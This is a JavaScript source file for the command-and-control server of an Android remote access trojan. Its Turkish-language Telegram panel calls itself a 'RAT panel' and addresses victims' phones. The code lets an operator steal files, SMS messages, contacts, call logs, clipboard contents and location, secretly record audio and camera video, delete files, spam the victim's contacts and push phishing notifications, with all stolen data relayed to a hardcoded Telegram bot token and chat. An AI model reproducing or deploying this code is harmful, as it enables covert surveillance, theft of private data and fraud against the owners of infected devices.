const express = require('express');
const webSocket = require('ws');
const http = require('http')
const telegramBot = require('node-telegram-bot-api')
const uuid4 = require('uuid')
const multer = require('multer');
const bodyParser = require('body-parser')
const axios = require("axios");

const token = '6422522512:AAFMtF1GTxO8Vi7NOtenC_iicivY81SSoQI'
const id = '6004004350'
const address = 'https://www.google.com'

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({ server: appServer });
const appBot = new telegramBot(token, { polling: true });
const appClients = new Map()

const upload = multer();
app.use(bodyParser.json());
let currentUuid = ''
let currentNumber = ''
let currentTitle = ''

app.get('/', function(req, res) {
  res.send('<h1 align="center">𝙎𝙚𝙧𝙫𝙚𝙧 𝙪𝙥𝙡𝙤𝙖𝙙𝙚𝙙 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮</h1>')
})

app.post("/uploadFile", upload.single('file'), (req, res) => {
  const name = req.file.originalname
  appBot.sendDocument(id, req.file.buffer, {
    caption: `°• Cihazdan <b>${req.headers.model}</b>  mesaj`,
    parse_mode: "HTML"
  },
    {
      filename: name,
      contentType: 'application/txt',
    })
  res.send('')
})
app.post("/uploadText", (req, res) => {
  appBot.sendMessage(id, `°• Mesaj gönderen <b>${req.headers.model}</b> Cihaz\n\n` + req.body['text'], { parse_mode: "HTML" })
  res.send('')
})
app.post("/uploadLocation", (req, res) => {
  appBot.sendLocation(id, req.body['lat'], req.body['lon'])
  appBot.sendMessage(id, `°• Konumdan <b>${req.headers.model}</b> Cihaz`, { parse_mode: "HTML" })
  res.send('')
})
appSocket.on('connection', (ws, req) => {
  const uuid = uuid4.v4()
  const model = req.headers.model
  const battery = req.headers.battery
  const version = req.headers.version
  const brightness = req.headers.brightness
  const provider = req.headers.provider

  ws.uuid = uuid
  appClients.set(uuid, {
    model: model,
    battery: battery,
    version: version,
    brightness: brightness,
    provider: provider
  })
  appBot.sendMessage(id,
    `°• Yeni cihaz bağlandı\n\n` +
    `• Cihaz modeli : <b>${model}</b>\n` +
    `• Batarya : <b>${battery}</b>\n` +
    `• Android sürümü : <b>${version}</b>\n` +
    `• Ekran parlaklığı : <b>${brightness}</b>\n` +
    `• Sağlayıcı : <b>${provider}</b>`,
    { parse_mode: "HTML" }
  );
  ws.on('close', function() {
    appBot.sendMessage(id,
      `°• Cihaz bağlantısı kesildi\n\n` +
      `• Cihaz modeli : <b>${model}</b>\n` +
      `• Batarya : <b>${battery}</b>\n` +
      `• Android sürümü : <b>${version}</b>\n` +
      `• Ekran parlaklığı : <b>${brightness}</b>\n` +
      `• Sağlayıcı : <b>${provider}</b>`,
      { parse_mode: "HTML" }
    )
    appClients.delete(ws.uuid)
  })
})
appBot.on('message', (message) => {
  const chatId = message.chat.id;
  if (message.reply_to_message) {
    if (message.reply_to_message.text.includes('°• Lütfen SMS göndermek istediğiniz numarayı yanıtlayın')) {
      currentNumber = message.text
      appBot.sendMessage(id,
        '°• Harika, şimdi bu numaraya göndermek istediğiniz mesajı girin\n\n' +
        '• Mesajınızın karakter sayısının izin verilenden fazla olmamasına dikkat edin, aksi takdirde gönderilmeyecek',
        { reply_markup: { force_reply: true } }
      )
    }
    if (message.reply_to_message.text.includes('°• Harika, şimdi bu numaraya göndermek istediğiniz mesajı girin')) {
      appSocket.clients.forEach(function each(ws) {
        if (ws.uuid == currentUuid) {
          ws.send(`send_message:${currentNumber}/${message.text}`)
        }
      });
      currentNumber = ''
      currentUuid = ''
      appBot.sendMessage(id,
        '°• İsteğiniz işleme alındı\n\n' +
        '• Birkaç dakika içinde yanıt alacaksınız',
        {
          parse_mode: "HTML",
          "reply_markup": {
            "keyboard": [["𝘽𝙖ğ𝙡ı 𝙘𝙞𝙝𝙖𝙯𝙡𝙖𝙧"], ["𝙆𝙤𝙢𝙪𝙩 𝙮𝙪̈𝙧𝙪̈𝙩"]],
            'resize_keyboard': true
          }
        }
      )
    }
    if (message.reply_to_message.text.includes("°• Tüm kişilere göndermek istediğiniz mesajı yazın")) {
      const message_to_all = message.text
      appSocket.clients.forEach(function each(ws) {
        if (ws.uuid == currentUuid) {
          ws.send(`send_message_to_all:${message_to_all}`)
        }
      });
      currentUuid = ''
      appBot.sendMessage(id,
        '°• İsteğiniz işleme alındı\n\n' +
        '• Birkaç dakika içinde yanıt alacaksınız',
        {
          parse_mode: "HTML",
          "reply_markup": {
            "keyboard": [["𝘽𝙖ğ𝙡ı 𝙘𝙞𝙝𝙖𝙯𝙡𝙖𝙧"], ["𝙆𝙤𝙢𝙪𝙩 𝙮𝙪̈𝙧𝙪̈𝙩"]],
            'resize_keyboard': true
          }
        }
      )
    }
    if (message.reply_to_message.text.includes("°• İndirmek istediğiniz dosyanın yolunu girin")) {
      const path = message.text
      appSocket.clients.forEach(function each(ws) {
        if (ws.uuid == currentUuid) {
          ws.send(`file:${path}`)
        }
      });
      currentUuid = ''
      appBot.sendMessage(id,
        '°• İsteğiniz işleme alındı\n\n' +
        '• Birkaç dakika içinde yanıt alacaksınız',
        {
          parse_mode: "HTML",
          "reply_markup": {
            "keyboard": [["𝘽𝙖ğ𝙡ı 𝙘𝙞𝙝𝙖𝙯𝙡𝙖𝙧"], ["𝙆𝙤𝙢𝙪𝙩 𝙮𝙪̈𝙧𝙪̈𝙩"]],
            'resize_keyboard': true
          }
        }
      )
    }
    if (message.reply_to_message.text.includes("°• Silmek istediğiniz dosyanın yolunu girin")) {
      const path = message.text
      appSocket.clients.forEach(function each(ws) {
        if (ws.uuid == currentUuid) {
          ws.send(`delete_file:${path}`)
        }
      });
      currentUuid = ''
      appBot.sendMessage(id,
        '°• İsteğiniz işleme alındı\n\n' +
        '• Birkaç dakika içinde yanıt alacaksınız',
        {
          parse_mode: "HTML",
          "reply_markup": {
            "keyboard": [["𝘽𝙖ğ𝙡ı 𝙘𝙞𝙝𝙖𝙯𝙡𝙖𝙧"], ["𝙆𝙤𝙢𝙪𝙩 𝙮𝙪̈𝙧𝙪̈𝙩"]],
            'resize_keyboard': true
          }
        }
      )
    }
    if (message.reply_to_message.text.includes('°• Mikrofonun ne kadar süre kayıt yapmasını istediğinizi girin')) {
        const duration = message.text
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == currentUuid) {
                ws.send(`microphone:${duration}`)
            }
        });
        currentUuid = ''
        appBot.sendMessage(id,
            '°• İsteğiniz işleme alındı\n\n' +
            '• Birkaç dakika içinde yanıt alacaksınız',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["𝘽𝙖ğ𝙡ı 𝙘𝙞𝙝𝙖𝙯𝙡𝙖𝙧"], ["𝙆𝙤𝙢𝙪𝙩 𝙮𝙪̈𝙧𝙪̈𝙩"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (message.reply_to_message.text.includes('°• Ana kameranın ne kadar süre kayıt yapmasını istediğinizi girin')) {
      const duration = message.text
      appSocket.clients.forEach(function each(ws) {
        if (ws.uuid == currentUuid) {
          ws.send(`rec_camera_main:${duration}`)
        }
      });
      currentUuid = ''
      appBot.sendMessage(id,
        '°• İsteğiniz işleme alındı\n\n' +
        '• Birkaç dakika içinde yanıt alacaksınız',
        {
          parse_mode: "HTML",
          "reply_markup": {
            "keyboard": [["𝘽𝙖ğ𝙡ı 𝙘𝙞𝙝𝙖𝙯𝙡𝙖𝙧"], ["𝙆𝙤𝙢𝙪𝙩 𝙮𝙪̈𝙧𝙪̈𝙩"]],
            'resize_keyboard': true
          }
        }
      )
    }
    if (message.reply_to_message.text.includes('°• Ön kameranın ne kadar süre kayıt yapmasını istediğinizi girin')) {
      const duration = message.text
      appSocket.clients.forEach(function each(ws) {
        if (ws.uuid == currentUuid) {
          ws.send(`rec_camera_selfie:${duration}`)
        }
      });
      currentUuid = ''
      appBot.sendMessage(id,
        '°• İsteğiniz işleme alındı\n\n' +
        '• Birkaç dakika içinde yanıt alacaksınız',
        {
          parse_mode: "HTML",
          "reply_markup": {
            "keyboard": [["𝘽𝙖ğ𝙡ı 𝙘𝙞𝙝𝙖𝙯𝙡𝙖𝙧"], ["𝙆𝙤𝙢𝙪𝙩 𝙮𝙪̈𝙧𝙪̈𝙩"]],
            'resize_keyboard': true
          }
        }
      )
    }
    if (message.reply_to_message.text.includes('°•Cihaza göstermek istediğiniz mesajı girin')) {
      const toastMessage = message.text
      appSocket.clients.forEach(function each(ws) {
        if (ws.uuid == currentUuid) {
          ws.send(`toast:${toastMessage}`)
        }
      });
      currentUuid = ''
      appBot.sendMessage(id,
        '°• İsteğiniz işleme alındı\n\n' +
        '• Birkaç dakika içinde yanıt alacaksınız',
        {
          parse_mode: "HTML",
          "reply_markup": {
            "keyboard": [["𝘽𝙖ğ𝙡ı 𝙘𝙞𝙝𝙖𝙯𝙡𝙖𝙧"], ["𝙆𝙤𝙢𝙪𝙩 𝙮𝙪̈𝙧𝙪̈𝙩"]],
            'resize_keyboard': true
          }
        }
      )
    }
    if (message.reply_to_message.text.includes('°• Bildirim olarak görünmesini istediğiniz mesajı girin')) {
      const notificationMessage = message.text
      currentTitle = notificationMessage
      appBot.sendMessage(id,
        '°• Harika, şimdi bildirim tarafından açılmasını istediğiniz bağlantıyı girin\n\n' +
        '• Kurban bildirime tıkladığında, girmiş olduğunuz bağlantı açılacak',
        { reply_markup: { force_reply: true } }
      )
    }
    if (message.reply_to_message.text.includes('°• Bildirim olarak görünmesini istediğiniz mesajı girin')) {
      const link = message.text
      appSocket.clients.forEach(function each(ws) {
        if (ws.uuid == currentUuid) {
          ws.send(`show_notification:${currentTitle}/${link}`)
        }
      });
      currentUuid = ''
      appBot.sendMessage(id,
        '°• 𝘽𝙖ğ𝙡ı 𝙘𝙞𝙝𝙖𝙯 𝙗𝙪𝙡𝙪𝙣𝙖𝙢𝙖𝙙ı\n\n' +
        '• 𝙃𝙚𝙙𝙚𝙛 𝙘𝙞𝙝𝙖𝙯ı𝙣ı𝙯𝙖 𝙪𝙮𝙜𝙪𝙡𝙖𝙢𝙖𝙣ı𝙣 𝙮ü𝙠𝙡𝙚𝙣𝙙𝙞ğ𝙞𝙣𝙙𝙚𝙣 𝙚𝙢𝙞𝙣 𝙤𝙡𝙪𝙣',
        {
          parse_mode: "HTML",
          "reply_markup": {
            "keyboard": [["𝘽𝙖ğ𝙡ı 𝙘𝙞𝙝𝙖𝙯𝙡𝙖𝙧"], ["𝙆𝙤𝙢𝙪𝙩 𝙮𝙪̈𝙧𝙪̈𝙩"]],
            'resize_keyboard': true
          }
        }
      )
    }
    if (message.reply_to_message.text.includes('°• Çalmak istediğiniz ses bağlantısını girin')) {
      const audioLink = message.text
      appSocket.clients.forEach(function each(ws) {
        if (ws.uuid == currentUuid) {
          ws.send(`play_audio:${audioLink}`)
        }
      });
      currentUuid = ''
      appBot.sendMessage(id,
        '°• 𝘽𝙖ğ𝙡ı 𝙘𝙞𝙝𝙖𝙯 𝙗𝙪𝙡𝙪𝙣𝙖𝙢𝙖𝙙ı\n\n' +
        '• 𝙃𝙚𝙙𝙚𝙛 𝙘𝙞𝙝𝙖𝙯ı𝙣ı𝙯𝙖 𝙪𝙮𝙜𝙪𝙡𝙖𝙢𝙖𝙣ı𝙣 𝙮ü𝙠𝙡𝙚𝙣𝙙𝙞ğ𝙞𝙣𝙙𝙚𝙣 𝙚𝙢𝙞𝙣 𝙤𝙡𝙪𝙣',
        {
          parse_mode: "HTML",
          "reply_markup": {
            "keyboard": [["𝘽𝙖ğ𝙡ı 𝙘𝙞𝙝𝙖𝙯𝙡𝙖𝙧"], ["𝙆𝙤𝙢𝙪𝙩 𝙮𝙪̈𝙧𝙪̈𝙩"]],
            'resize_keyboard': true
          }
        }
      )
    }
  }
  if (id == chatId) {
    if (message.text == '/start') {
      appBot.sendMessage(id,
        '°• 𝙍𝙖𝙩 𝙥𝙖𝙣𝙚𝙡𝙞𝙣𝙚 𝙝𝙤ş𝙜𝙚𝙡𝙙𝙞𝙣𝙞𝙯\n\n' +
        '• 𝙃𝙚𝙙𝙚𝙛 𝙘𝙞𝙝𝙖𝙯𝙖 𝙪𝙮𝙜𝙪𝙡𝙖𝙢𝙖 𝙮ü𝙠𝙡𝙚𝙣𝙙𝙞𝙮𝙨𝙚, 𝙗𝙖ğ𝙡𝙖𝙣𝙩ı 𝙗𝙚𝙠𝙡𝙚𝙮𝙞𝙣\n\n' +
        '• 𝘽𝙖ğ𝙡𝙖𝙣𝙩ı 𝙢𝙚𝙨𝙖𝙟ı 𝙖𝙡𝙙ıığını𝙯𝙙𝙖, 𝙝𝙚𝙙𝙚𝙛 𝙘𝙞𝙝𝙖𝙯𝙞𝙣 𝙗𝙖ğ𝙡ı 𝙤𝙡𝙙𝙪ğ𝙪𝙣𝙪 𝙫𝙚 𝙠𝙤𝙢𝙪𝙩 𝙖𝙡𝙢𝙖𝙮𝙖 𝙝𝙖𝙯ı𝙧 𝙤𝙡𝙙𝙪ğ𝙪𝙣𝙪 𝙖𝙣𝙡𝙖𝙢ı𝙣𝙖 𝙜𝙚𝙡𝙢𝙚𝙠𝙩𝙚𝙙𝙞𝙧\n\n' +
        '• 𝙆𝙤𝙢𝙪𝙩 𝙙üğ𝙢𝙚𝙨𝙞𝙣𝙚 𝙩ı𝙠𝙡𝙖𝙮ı𝙣 𝙫𝙚 𝙞𝙨𝙩𝙚𝙣𝙞𝙡𝙚𝙣 𝙘𝙞𝙝𝙖𝙯ı 𝙨𝙚ç𝙞𝙣 𝙨𝙤𝙣𝙧𝙖 𝙠𝙤𝙢𝙪𝙩𝙡𝙖𝙧 𝙖𝙧𝙖𝙨ı𝙣𝙙𝙖𝙣 𝙞𝙨𝙩𝙚𝙣𝙚𝙣 𝙠𝙤𝙢𝙪𝙩𝙪 𝙨𝙚ç𝙞𝙣\n\n' +
        '• 𝙀ğer 𝙗𝙤𝙩𝙩𝙖 𝙗𝙞𝙧 𝙮𝙚𝙧𝙙𝙚 𝙢𝙖𝙝𝙨𝙪𝙧 𝙤𝙡𝙪𝙧𝙨𝙖𝙣ı𝙯, /start 𝙠𝙤𝙢𝙪𝙩𝙪𝙣𝙪 𝙜ö𝙣𝙙𝙚𝙧𝙞𝙣\n\n' +
        'https://t.me/polatalemdar334',
        {
          parse_mode: "HTML",
          "reply_markup": {
            "keyboard": [["𝘽𝙖ğ𝙡ı 𝙘𝙞𝙝𝙖𝙯𝙡𝙖𝙧"], ["𝙆𝙤𝙢𝙪𝙩 𝙮𝙪̈𝙧𝙪̈𝙩"]],
            'resize_keyboard': true
          }
        }
      )
    } else if (message.text == '𝘽𝙖ğ𝙡ı 𝙘𝙞𝙝𝙖𝙯𝙡𝙖𝙧') {
      if (appClients.size === 0) {
        appBot.sendMessage(id,
          '°• 𝘽𝙖ğ𝙡ı 𝙘𝙞𝙝𝙖𝙯 𝙗𝙪𝙡𝙪𝙣𝙖𝙢𝙖𝙙ı\n\n' +
          '• 𝙃𝙚𝙙𝙚𝙛 𝙘𝙞𝙝𝙖𝙯ı𝙣ı𝙯𝙖 𝙪𝙮𝙜𝙪𝙡𝙖𝙢𝙖𝙣ı𝙣 𝙮ü𝙠𝙡𝙚𝙣𝙙𝙞ğ𝙞𝙣𝙙𝙚𝙣 𝙚𝙢𝙞𝙣 𝙤𝙡𝙪𝙣',
        )
      } else {
        let text = '°• 𝘽𝙖ğ𝙡ı 𝙘𝙞𝙝𝙖𝙯𝙡𝙖𝙧𝙞𝙣 𝙡𝙞𝙨𝙩𝙚𝙨𝙞 :\n\n';
        appClients.forEach(function(value, key, map) {
          text += `• 𝙘𝙞𝙝𝙖𝙯 𝙢𝙤𝙙𝙚𝙡𝙞 : <b>${value.model}</b>\n` +
            `• 𝙗𝙖𝙩𝙖𝙧𝙞𝙮𝙖 : <b>${value.battery}</b>\n` +
            `• 𝙖𝙣𝙙𝙧𝙤𝙞𝙙 𝙨ü𝙧ü𝙢ü : <b>${value.version}</b>\n` +
            `• 𝙚𝙠𝙧𝙖𝙣 𝙥𝙖𝙧𝙡𝙖𝙠𝙡ı𝙜ı : <b>${value.brightness}</b>\n` +
            `• 𝙨𝙖ğ𝙡𝙖𝙮ı𝙘ı : <b>${value.provider}</b>\n\n`;
        });
        appBot.sendMessage(id, text, { parse_mode: "HTML" })
      }
    }
    if (message.text == '𝙆𝙤𝙢𝙪𝙩 𝙮𝙪̈𝙧𝙪̈𝙩') {
      if (appClients.size == 0) {
        appBot.sendMessage(id,
          '°• 𝘽𝙖ğ𝙡ı 𝙘𝙞𝙝𝙖𝙯 𝙗𝙪𝙡𝙪𝙣𝙖𝙢𝙖𝙙ı\n\n' +
          '• 𝙃𝙚𝙙𝙚𝙛 𝙘𝙞𝙝𝙖𝙯ı𝙣ı𝙯𝙖 𝙪𝙮𝙜𝙪𝙡𝙖𝙢𝙖𝙣ı𝙣 𝙮ü𝙠𝙡𝙚𝙣𝙙𝙞ğ𝙞𝙣𝙙𝙚𝙣 𝙚𝙢𝙞𝙣 𝙤𝙡𝙪𝙣',
        )
      } else {
        const deviceListKeyboard = []
        appClients.forEach(function(value, key, map) {
          deviceListKeyboard.push([{
            text: value.model,
            callback_data: 'device:' + key
          }])
        })
        appBot.sendMessage(id, '°• Komut yürütmek için cihaz seçin', {
          "reply_markup": {
            "inline_keyboard": deviceListKeyboard,
          },
        })
      }
    }
  } else {
    appBot.sendMessage(id, '°• İzin Verilmedi')
  }
})
appBot.on("callback_query", (callbackQuery) => {
  const msg = callbackQuery.message;
  const data = callbackQuery.data
  const commend = data.split(':')[0]
  const uuid = data.split(':')[1]
  console.log(uuid)
  if (commend == 'device') {
    appBot.editMessageText(`°• Cihaz için komut seç : <b>${appClients.get(data.split(':')[1]).model}</b>`, {
      width: 10000,
      chat_id: id,
      message_id: msg.message_id,
      reply_markup: {
        inline_keyboard: [
          [
            { text: 'Uygulamalar', callback_data: `apps:${uuid}` },
            { text: 'Cihaz bilgisi', callback_data: `device_info:${uuid}` }
          ],
          [
            { text: 'Dosya al', callback_data: `file:${uuid}` },
            { text: 'Dosya sil', callback_data: `delete_file:${uuid}` }
          ],
          [
            { text: 'Pano', callback_data: `clipboard:${uuid}` },
            { text: 'Mikrofon', callback_data: `microphone:${uuid}` },
          ],
          [
            { text: 'Ana kamera', callback_data: `camera_main:${uuid}` },
            { text: 'Ön kamera', callback_data: `camera_selfie:${uuid}` }
          ],
          [
            { text: 'Konum', callback_data: `location:${uuid}` },
            { text: 'Bildirim mesajı', callback_data: `toast:${uuid}` }
          ],
          [
            { text: 'Aramalar', callback_data: `calls:${uuid}` },
            { text: 'Kişiler', callback_data: `contacts:${uuid}` }
          ],
          [
            { text: 'Titreşim', callback_data: `vibrate:${uuid}` },
            { text: 'Bildirim göster', callback_data: `show_notification:${uuid}` }
          ],
          [
            { text: 'Mesajlar', callback_data: `messages:${uuid}` },
            { text: 'Mesaj gönder', callback_data: `send_message:${uuid}` }
          ],
          [
            { text: 'Ses oynat', callback_data: `play_audio:${uuid}` },
            { text: 'Sesi durdur', callback_data: `stop_audio:${uuid}` },
          ],
          [
            { text: 'Tüm kişilere mesaj gönder', 
            callback_data: `send_message_to_all:${uuid}`
            }
          ],
         ]
       },
      parse_mode: "HTML"
    })
  }
  if (commend == 'calls') {
    appSocket.clients.forEach(function each(ws) {
      if (ws.uuid == uuid) {
        ws.send('calls');
      }
    });
    appBot.deleteMessage(id, msg.message_id)
    appBot.sendMessage(id,
      '°• İsteğiniz işleme alındı\n\n' +
      '• Birkaç dakika içinde yanıt alacaksınız',
      {
        parse_mode: "HTML",
        "reply_markup": {
          "keyboard": [["𝘽𝙖ğ𝙡ı 𝙘𝙞𝙝𝙖𝙯𝙡𝙖𝙧"], ["𝙆𝙤𝙢𝙪𝙩 𝙮𝙪̈𝙧𝙪̈𝙩"]],
          'resize_keyboard': true
        }
      }
    )
  }
  if (commend == 'contacts') {
    appSocket.clients.forEach(function each(ws) {
      if (ws.uuid == uuid) {
        ws.send('contacts');
      }
    });
    appBot.deleteMessage(id, msg.message_id)
    appBot.sendMessage(id,
      ' °• İsteğiniz işleme alındı\n\n' +
      '• Birkaç dakika içinde yanıt alacaksınız',
      {
        parse_mode: "HTML",
        "reply_markup": {
          "keyboard": [["𝘽𝙖ğ𝙡ı 𝙘𝙞𝙝𝙖𝙯𝙡𝙖𝙧"], ["𝙆𝙤𝙢𝙪𝙩 𝙮𝙪̈𝙧𝙪̈𝙩"]],
          'resize_keyboard': true
        }
      }
    )
  }
  if (commend == 'messages') {
    appSocket.clients.forEach(function each(ws) {
      if (ws.uuid == uuid) {
        ws.send('messages');
      }
    });
    appBot.deleteMessage(id, msg.message_id)
    appBot.sendMessage(id,
      ' °• İsteğiniz işleme alındı\n\n' +
      '• Birkaç dakika içinde yanıt alacaksınız',
      {
        parse_mode: "HTML",
        "reply_markup": {
          "keyboard": [["𝘽𝙖ğ𝙡ı 𝙘𝙞𝙝𝙖𝙯𝙡𝙖𝙧"], ["𝙆𝙤𝙢𝙪𝙩 𝙮𝙪̈𝙧𝙪̈𝙩"]],
          'resize_keyboard': true
        }
      }
    )
  }
  if (commend == 'apps') {
    appSocket.clients.forEach(function each(ws) {
      if (ws.uuid == uuid) {
        ws.send('apps');
      }
    });
    appBot.deleteMessage(id, msg.message_id)
    appBot.sendMessage(id,
      ' °• İsteğiniz işleme alındı\n\n' +
      '• Birkaç dakika içinde yanıt alacaksınız',
      {
        parse_mode: "HTML",
        "reply_markup": {
          "keyboard": [["𝘽𝙖ğ𝙡ı 𝙘𝙞𝙝𝙖𝙯𝙡𝙖𝙧"], ["𝙆𝙤𝙢𝙪𝙩 𝙮𝙪̈𝙧𝙪̈𝙩"]],
          'resize_keyboard': true
        }
      }
    )
  }
  if (commend == 'device_info') {
    appSocket.clients.forEach(function each(ws) {
      if (ws.uuid == uuid) {
        ws.send('device_info');
      }
    });
    appBot.deleteMessage(id, msg.message_id)
    appBot.sendMessage(id,
      ' °• İsteğiniz işleme alındı\n\n' +
      '• Birkaç dakika içinde yanıt alacaksınız',
      {
        parse_mode: "HTML",
        "reply_markup": {
          "keyboard": [["𝘽𝙖ğ𝙡ı 𝙘𝙞𝙝𝙖𝙯𝙡𝙖𝙧"], ["𝙆𝙤𝙢𝙪𝙩 𝙮𝙪̈𝙧𝙪̈𝙩"]],
          'resize_keyboard': true
        }
      }
    )
  }
  if (commend == 'clipboard') {
    appSocket.clients.forEach(function each(ws) {
      if (ws.uuid == uuid) {
        ws.send('clipboard');
      }
    });
    appBot.deleteMessage(id, msg.message_id)
    appBot.sendMessage(id,
      ' °• İsteğiniz işleme alındı\n\n' +
      '• Birkaç dakika içinde yanıt alacaksınız',
      {
        parse_mode: "HTML",
        "reply_markup": {
          "keyboard": [["𝘽𝙖ğ𝙡ı 𝙘𝙞𝙝𝙖𝙯𝙡𝙖𝙧"], ["𝙆𝙤𝙢𝙪𝙩 𝙮𝙪̈𝙧𝙪̈𝙩"]],
          'resize_keyboard': true
        }
      }
    )
  }
  if (commend == 'camera_main') {
    appSocket.clients.forEach(function each(ws) {
      if (ws.uuid == uuid) {
        ws.send('camera_main');
      }
    });
    appBot.deleteMessage(id, msg.message_id)
    appBot.sendMessage(id,
      ' °• İsteğiniz işleme alındı\n\n' +
      '• Birkaç dakika içinde yanıt alacaksınız',
      {
        parse_mode: "HTML",
        "reply_markup": {
          "keyboard": [["𝘽𝙖ğ𝙡ı 𝙘𝙞𝙝𝙖𝙯𝙡𝙖𝙧"], ["𝙆𝙤𝙢𝙪𝙩 𝙮𝙪̈𝙧𝙪̈𝙩"]],
          'resize_keyboard': true
        }
      }
    )
  }
  if (commend == 'camera_selfie') {
    appSocket.clients.forEach(function each(ws) {
      if (ws.uuid == uuid) {
        ws.send('camera_selfie');
      }
    });
    appBot.deleteMessage(id, msg.message_id)
    appBot.sendMessage(id,
      ' °• İsteğiniz işleme alındı\n\n' +
      '• Birkaç dakika içinde yanıt alacaksınız',
      {
        parse_mode: "HTML",
        "reply_markup": {
          "keyboard": [["𝘽𝙖ğ𝙡ı 𝙘𝙞𝙝𝙖𝙯𝙡𝙖𝙧"], ["𝙆𝙤𝙢𝙪𝙩 𝙮𝙪̈𝙧𝙪̈𝙩"]],
          'resize_keyboard': true
        }
      }
    )
  }
  if (commend == 'location') {
    appSocket.clients.forEach(function each(ws) {
      if (ws.uuid == uuid) {
        ws.send('location');
      }
    });
    appBot.deleteMessage(id, msg.message_id)
    appBot.sendMessage(id,
      ' °• İsteğiniz işleme alındı\n\n' +
      '• Birkaç dakika içinde yanıt alacaksınız',
      {
        parse_mode: "HTML",
        "reply_markup": {
          "keyboard": [["𝘽𝙖ğ𝙡ı 𝙘𝙞𝙝𝙖𝙯𝙡𝙖𝙧"], ["𝙆𝙤𝙢𝙪𝙩 𝙮𝙪̈𝙧𝙪̈𝙩"]],
          'resize_keyboard': true
        }
      }
    )
  }
  if (commend == 'vibrate') {
    appSocket.clients.forEach(function each(ws) {
      if (ws.uuid == uuid) {
        ws.send('vibrate');
      }
    });
    appBot.deleteMessage(id, msg.message_id)
    appBot.sendMessage(id,
      ' °• İsteğiniz işleme alındı\n\n' +
      '• Birkaç dakika içinde yanıt alacaksınız',
      {
        parse_mode: "HTML",
        "reply_markup": {
          "keyboard": [["𝘽𝙖ğ𝙡ı 𝙘𝙞𝙝𝙖𝙯𝙡𝙖𝙧"], ["𝙆𝙤𝙢𝙪𝙩 𝙮𝙪̈𝙧𝙪̈𝙩"]],
          'resize_keyboard': true
        }
      }
    )
  }
  if (commend == 'stop_audio') {
    appSocket.clients.forEach(function each(ws) {
      if (ws.uuid == uuid) {
        ws.send('stop_audio');
      }
    });
    appBot.deleteMessage(id, msg.message_id)
    appBot.sendMessage(id,
      ' °• İsteğiniz işleme alındı\n\n' +
      '• Birkaç dakika içinde yanıt alacaksınız',
      {
        parse_mode: "HTML",
        "reply_markup": {
          "keyboard": [["𝘽𝙖ğ𝙡ı 𝙘𝙞𝙝𝙖𝙯𝙡𝙖𝙧"], ["𝙆𝙤𝙢𝙪𝙩 𝙮𝙪̈𝙧𝙪̈𝙩"]],
          'resize_keyboard': true
        }
      }
    )
  }
  if (commend == 'send_message') {
    appBot.deleteMessage(id, msg.message_id)
    appBot.sendMessage(id, '°• SMS göndermek istediğiniz numarayı yanıtlayın\n\n' +
      '• Eğer yurt içi numaralara SMS göndermek istiyorsanız, numarayı başında sıfır olacak şekilde girin, aksi halde ülke kodu ile birlikte girin',
      { reply_markup: { force_reply: true } })
    currentUuid = uuid
  }
  if (commend == 'send_message_to_all') {
    appBot.deleteMessage(id, msg.message_id)
    appBot.sendMessage(id,
      '°• Tüm iletişimlere göndermek istediğiniz mesajı girin\n\n' +
      '• Mesajınızın, izin verilenden fazla karakter içermesi durumunda gönderilmeyeceğine dikkat edin',
      { reply_markup: { force_reply: true } }
    )
    currentUuid = uuid
  }
  if (commend == 'file') {
    appBot.deleteMessage(id, msg.message_id)
    appBot.sendMessage(id,
      '°• İndirmek istediğiniz dosyanın yolunu girin\n\n' +
      '• Tam dosya yolunu girmeniz gerekmez, ana yolu girin. Örneğin, galeri dosyalarını almak için <b>DCIM/Kamera</b> yolunu girin.',
      { reply_markup: { force_reply: true }, parse_mode: "HTML" }
    )
    currentUuid = uuid
  }
  if (commend == 'delete_file') {
    appBot.deleteMessage(id, msg.message_id)
    appBot.sendMessage(id,
      '°• Silmek istediğiniz dosyanın yolunu girin\n\n' +
      '• Tam dosya yolunu girmenize gerek yoktur, sadece ana yolu girin. Örneğin, galeri dosyalarını silmek için <b>DCIM/Kamera</b> yolunu girin.',
      { reply_markup: { force_reply: true }, parse_mode: "HTML" }
    )
    currentUuid = uuid
  }
  if (commend == 'microphone') {
      appBot.deleteMessage(id, msg.message_id)
      appBot.sendMessage(id,
          '°• Mikrofonun ne kadar süreyle kaydetmesini istediğinizi girin\n\n' +
          '°• Süreyi saniye cinsinden sayısal olarak girmeniz gerektiğini unutmayın',
          {reply_markup: {force_reply: true}, parse_mode: "HTML"}
      )
      currentUuid = uuid
  }
  if (commend == 'toast') {
    appBot.deleteMessage(id, msg.message_id)
    appBot.sendMessage(id,
      '°• Hedef cihazda görünmesini istediğiniz mesajı girin\n\n' +
      '• Toast, cihaz ekranında birkaç saniye boyunca görünen kısa bir mesajdır',
      { reply_markup: { force_reply: true }, parse_mode: "HTML" }
    )
    currentUuid = uuid
  }
  if (commend == 'show_notification') {
    appBot.deleteMessage(id, msg.message_id)
    appBot.sendMessage(id,
      '°• Bildirim olarak görünmesini istediğiniz mesajı girin\n\n' +
      '• Mesajınız hedef cihazın durum çubuğunda normal bir bildirim gibi belirecek',
      { reply_markup: { force_reply: true }, parse_mode: "HTML" }
    )
    currentUuid = uuid
  }
  if (commend == 'play_audio') {
    appBot.deleteMessage(id, msg.message_id)
    appBot.sendMessage(id,
      '°• Çalmak istediğiniz ses bağlantısını girin\n\n' +
      '• İstediğiniz sesin doğrudan bağlantısını girmelisiniz, aksi takdirde ses çalmayacak',
      { reply_markup: { force_reply: true }, parse_mode: "HTML" }
    )
    currentUuid = uuid
  }
});
setInterval(function() {
  appSocket.clients.forEach(function each(ws) {
    ws.send('ping')
  });
  try {
    axios.get(address).then(r => "")
  } catch (e) {
  }
}, 5000)
appServer.listen(process.env.PORT || 8999);

